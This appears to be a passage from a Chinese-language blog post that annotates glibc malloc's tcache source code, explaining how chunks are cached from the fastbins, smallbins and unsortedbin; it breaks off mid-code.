<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span><span class="comment">//将chunk放到tc_idx下标的tcache中</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class="comment">//tcache_entry指针指向mem区,而不是基地址</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];<span class="comment">//头插法</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);<span class="comment">//tc_idx对应计数器自增</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span><span class="comment">//从tc_idx桶子中拿出一个堆块</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_thread_shutdown</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;<span class="comment">//线程死亡时释放这个线程的tcache,实际上调用free函数释放该线程的tcache中的堆块</span></span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tcache)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Disable the tcache and prevent it from being reinitialized.  */</span></span><br><span class="line">  tcache = <span class="literal">NULL</span>;</span><br><span class="line">  tcache_shutting_down = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free all of the entries and the tcache itself back to the arena</span></span><br><span class="line"><span class="comment">     heap for coalescing.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> (tcache_tmp-&gt;entries[i])</span><br><span class="line">	&#123;</span><br><span class="line">	  tcache_entry *e = tcache_tmp-&gt;entries[i];</span><br><span class="line">	  tcache_tmp-&gt;entries[i] = e-&gt;next;</span><br><span class="line">	  __libc_free (e);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_free (tcache_tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line">    <span class="comment">//tcache_perthread_struct这个结构本身就是堆上分配的一个堆块</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="algorithm">algorithm</h2>
<p>调用malloc的过程是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">malloc</span><br><span class="line">	-&gt;libc_malloc</span><br><span class="line">		-&gt;use tcache</span><br><span class="line">		-&gt;int_malloc</span><br></pre></td></tr></table></figure>
<p>如果在libc_malloc中使用tcache能够完成分配,则不需要调用int_malloc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">启用tcache后,分配过程宏观上看是这样的</span><br><span class="line">如果libc_malloc中,发现对应tcache中有合适的堆块,直接拿出来返回</span><br><span class="line">否则需要调用int_malloc,对bins中的堆块进行缓存和分类,然后返回</span><br></pre></td></tr></table></figure>
<h3 id="libc_malloc">libc_malloc</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line">	....</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);<span class="comment">//计算应该到哪个tcache中取堆块</span></span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins		<span class="comment">//tc_idx是否落在tcache范围内,也就是说堆块大小是不是在tcache管理范围内</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache	<span class="comment">//是否已经初始化</span></span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)		<span class="comment">//对应的桶子中是否有剩余堆块</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);	<span class="comment">//哪一个堆块,返回值,由于tcache中指针自然指向mem区域,因此不需要再指针转换</span></span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>
<h3 id="int_malloc">int_malloc</h3>
<p>fastbin和smallbin的缓存算法基本一致</p>
<p>unsortedbin的缓存算法比较复杂</p>
<p>largebin不需要缓存</p>
<h4 id="对fastbin的缓存">对fastbin的缓存</h4>
<p>fastbin中的分配规则为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果对应nb的fastbin中有至少一个堆块,首先把这个堆块拿出来放到victim上</span><br><span class="line">然后把这个桶子中其他堆块拆下来,塞进tcache,直到tcache的对应桶子中塞满7个为止</span><br><span class="line">最后返回那个victim</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  if ((unsigned long)(nb) &lt;= (unsigned long)(get_max_fast()))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = fastbin_index(nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">    mchunkptr pp;</span><br><span class="line">    victim = *fb;</span><br><span class="line"></span><br><span class="line">    if (victim != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      if (SINGLE_THREAD_P)//单线程的情况</span><br><span class="line">        *fb = victim-&gt;fd;</span><br><span class="line">      else//多线程的情况</span><br><span class="line">        REMOVE_FB(fb, pp, victim);//首先拿出一个堆块来</span><br><span class="line">      if (__glibc_likely(victim != NULL))</span><br><span class="line">      &#123;</span><br><span class="line">        size_t victim_idx = fastbin_index(chunksize(victim));</span><br><span class="line">        if (__builtin_expect(victim_idx != idx, 0))</span><br><span class="line">          malloc_printerr(&quot;malloc(): memory corruption (fast)&quot;);</span><br><span class="line">        check_remalloced_chunk(av, victim, nb);</span><br><span class="line">#if USE_TCACHE				//已经拿出了一个符合要求的堆块,剩余的堆块放到tcache中缓存(直到tcache满),如果tcache满了就不再往里塞了</span><br><span class="line">        /* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="line">     stash them in the tcache.  */</span><br><span class="line">        size_t tc_idx = csize2tidx(nb);</span><br><span class="line">        if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          /* While bin not empty and tcache not full, copy chunks.  */</span><br><span class="line">          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL)</span><br><span class="line">          &#123;</span><br><span class="line">            if (SINGLE_THREAD_P)</span><br><span class="line">              *fb = tc_victim-&gt;fd;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">              REMOVE_FB(fb, pp, tc_victim);</span><br><span class="line">              if (__glibc_unlikely(tc_victim == NULL))</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            tcache_put(tc_victim, tc_idx);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">#endif</span><br><span class="line">        void *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        return p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h4 id="对smallbin的缓存">对smallbin的缓存</h4>
<p>smallbin的分配规则</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果对应smallbin中有至少一个堆块,把他拿下来放到victim上</span><br><span class="line">该smallbin桶子中剩余的堆块放到对应tcache上,直到放满7个</span><br><span class="line">最后返回victim</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin)<span class="comment">//首先取出一个last(bin)堆块来给victim</span></span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">      set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">      bin-&gt;bk = bck;<span class="comment">//将victim从链上摘下来</span></span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        set_non_main_arena(victim);</span><br><span class="line">      check_malloced_chunk(av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE			<span class="comment">//本桶子中剩余的堆块塞进tcache,塞满7个为止,多余的仍在smallbin中放着</span></span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">         stash them in the tcache.  */</span></span><br><span class="line">      <span class="type">size_t</span> tc_idx = csize2tidx(nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">        mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">        <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last(bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            bck = tc_victim-&gt;bk;</span><br><span class="line">            set_inuse_bit_at_offset(tc_victim, nb);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">              set_non_main_arena(tc_victim);</span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">            tcache_put(tc_victim, tc_idx);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">      alloc_perturb(p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h4 id="对unsortedbin的缓存">对unsortedbin的缓存</h4>
<p>对unsortedbin的缓存算法是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">拿出一个victim,如果是last_remainder,并且大小合适,则直接从其上进行分割然后 返回,不会进行缓存</span><br><span class="line">否则</span><br><span class="line">	如果victim大小正好满足要求,不急着返回,而是首先尝试将其放到tcache中缓存</span><br><span class="line">		如果tcache有空位置则放进去,然后tcache_nb置1表明至少tcache中有一个适配堆块</span><br><span class="line">		如果tcache没有位置则直接 返回</span><br><span class="line">	如果victim大小不满足要求,则根据其大小放到smallbin或者largebin</span><br><span class="line">如果tcache_nb标志为1,并且在unsortedbin中转了足够多圈了,从tcache_nb 返回</span><br><span class="line">否则重新循环</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av))<span class="comment">//每次拿出一个堆块交给victim</span></span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect(chunksize_nomask(victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br><span class="line">      size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">         only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">         runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">         exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">         no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(nb) &amp;&amp;</span><br><span class="line">          bck == unsorted_chunks(av) &amp;&amp;</span><br><span class="line">          victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">          (<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE))</span><br><span class="line">      &#123;<span class="comment">//如果是last_remainder则直接分配,此时不会再进行tcache缓存,推测原因是last_remainder刚用过,还在内存中,命中概率大</span></span><br><span class="line">        <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder = chunk_at_offset(victim, nb);</span><br><span class="line">        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;</span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        set_foot(remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">	<span class="comment">//不是last_remainder</span></span><br><span class="line">      <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">      unsorted_chunks(av)-&gt;bk = bck;<span class="comment">//把victim拆下来</span></span><br><span class="line">      bck-&gt;fd = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (size == nb)<span class="comment">//如果当前堆块的大小符合要求,不会立刻分配,首先应该放到tcache中</span></span><br><span class="line">      &#123;</span><br><span class="line">        set_inuse_bit_at_offset(victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">          set_non_main_arena(victim);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">        <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">     We may return one of these chunks later.  */</span></span><br><span class="line">        <span class="keyword">if</span> (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">        &#123;</span><br><span class="line">          tcache_put(victim, tc_idx);</span><br><span class="line">          return_cached = <span class="number">1</span>;<span class="comment">//记录至少有一个堆块放到了tcache,待会儿就可以从tcache中拿堆块了</span></span><br><span class="line">          <span class="keyword">continue</span>;	<span class="comment">//continue直接跳到while一开始拿下一个堆块了</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//直到对应tcache存满了才会直接进行分配</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          check_malloced_chunk(av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">          alloc_perturb(p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line">		<span class="comment">//到此说明victim既不是last_remainder,大小也不是正合适</span></span><br><span class="line">      <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(size))<span class="comment">//如果victim是smallbin范围的</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim_index = smallbin_index(size);<span class="comment">//放进smallbin</span></span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span><span class="comment">//否则说明是largebin中的,放到largebin,不会进入smallbin</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim_index = largebin_index(size);</span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* maintain large bins in sorted 